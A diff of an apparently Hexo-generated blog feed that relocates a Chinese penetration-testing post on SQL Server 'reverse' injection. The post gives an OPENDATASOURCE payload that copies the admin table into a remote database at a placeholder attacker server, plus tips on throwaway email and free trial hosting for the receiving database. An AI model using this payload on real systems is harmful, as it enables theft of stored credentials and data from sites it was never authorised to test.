@@ -168,6 +168,30 @@
   </entry>
   
   <entry>
+    <title>SQLSever的反弹注入</title>
+    <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
+    <id>/2019/10/14/sqlsever反弹注入/</id>
+    <published>2019-10-14T15:08:24.000Z</published>
+    <updated>2019-11-01T14:50:26.600Z</updated>
+    
+    <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。&lt;/p&gt;
+&lt;p&gt;这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="sql注入" scheme="/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
     <title>两数之和</title>
     <link href="/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
     <id>/2019/10/14/两数之和/</id>
@@ -190,30 +214,6 @@
     
     
       <category term="两数之和" scheme="/tags/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQLSever的反弹注入</title>
-    <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
-    <id>/2019/10/14/sqlsever反弹注入/</id>
-    <published>2019-10-14T15:08:24.000Z</published>
-    <updated>2019-11-01T14:50:26.600Z</updated>
-    
-    <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。&lt;/p&gt;
-&lt;p&gt;这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="sql注入" scheme="/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
